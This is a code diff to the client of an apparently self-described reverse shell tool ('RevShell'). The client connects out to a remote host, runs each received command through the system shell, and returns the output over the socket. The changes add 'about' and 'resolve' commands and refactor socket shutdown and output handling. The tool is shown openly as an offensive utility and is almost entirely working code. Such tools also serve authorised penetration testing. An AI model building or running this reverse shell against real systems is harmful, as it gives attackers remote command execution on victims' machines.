@@ -4,7 +4,9 @@ import getpass
 from .nodeutils import (
     os,
     shutil,
+    time,
     Path,
+    platform,
     subprocess,
     struct,
     sys,
@@ -17,6 +19,7 @@ from .nodeutils import (
 class Client(StreamSocket):
     """TCP socket client class for the command shell"""
     # TODO: add handling for custom shell executables
+    # TODO: fix issues with clear not working in all terminals
     def __init__(
         self,
         rhost: str,
@@ -35,12 +38,18 @@ class Client(StreamSocket):
     def execute(self, command: str) -> tuple:
         """Execute the command using system shell subprocess,
         returns the a list of stdin, stdout, and stderr."""
+        # TODO: continue/finish adding special commands
         family = self.check_special(command)
 
         if family is not None:
+            if family == "about":
+                return self.about_host(), b""
+
             if family == "clear":
-                #return [command.encode(), utils.Ansi.clear(), b""]
-                return utils.Ansi.clear(), b""
+                return utils.Ansi.clear().encode(), b""
+
+            if family == "resolve":
+                return self.nslookup(command), b""
 
             if family == "cd":
                 exists, path = self._change_dir(command)
@@ -52,13 +61,19 @@ class Client(StreamSocket):
             if family == "ls":
                 if utils.OPSYS != "nt":
                     command = f"{command} -A --color"
-            # TODO: fix issue with grep throwing false-positives
-            elif family == "grep":
-                #if utils.OPSYS != "nt":
-                #command = f"{command} -i --color"
-                pass
 
-        return self._run_cmd(command, self.Shell)
+        stdout, stderr = self._run_cmd(command, self.Shell)
+        return stdout, stderr
+
+    @staticmethod
+    def shutdown(sock: socket.socket) -> None:
+        """Cleanup and close the specified socket"""
+        try:
+            sock.shutdown(socket.SHUT_WR)
+        except OSError:
+            pass
+        finally:
+            sock.close()
 
     def connect(self) -> None:
         """Initiate connection to remote server shell"""
@@ -99,9 +114,7 @@ class Client(StreamSocket):
                         utils.status("Exiting RevShell.")
                     break
 
-                cmd_out = self.execute(command)
-                stdout = cmd_out[0]
-                stderr = cmd_out[1]
+                stdout, stderr = self.execute(command)
 
                 if stderr == b"":
                     output = stdout
@@ -117,16 +130,12 @@ class Client(StreamSocket):
                     utils.stdin_status(command, level)
 
                 # send ==> command output
-                if output == stdout:
+                if level == "output":
                     self.send_output(sock, output.decode(), "output")
                 else:
                     self.send_output(sock, output.decode(), "error")
         except Exception as exc:
+            self.shutdown(sock)
             self.except_handler(exc)
         finally:
-            try:
-                sock.shutdown(socket.SHUT_WR)
-            except OSError:
-                pass
-            finally:
-                sock.close()
+            self.shutdown(sock)
